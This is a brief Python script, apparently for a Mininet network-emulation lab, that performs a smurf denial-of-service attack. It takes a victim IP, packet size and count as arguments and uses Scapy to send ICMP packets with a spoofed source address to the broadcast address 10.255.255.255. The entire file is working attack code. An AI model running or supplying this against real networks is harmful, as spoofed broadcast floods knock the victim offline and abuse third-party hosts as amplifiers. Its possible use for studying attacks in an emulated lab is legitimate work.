import sys
from mininet.log import info, setLogLevel
from scapy.all import *

if __name__ == '__main__':
    print "Usage: smurf_attack <source ip> <pckt size> <num requests> "

    values = sys.argv
    setLogLevel('info')
    for x in range (int(values[3])) :
        send(IP(src=values[1],dst='10.255.255.255')/ICMP()/Raw(RandString(size=int(values[2]))),verbose=0)
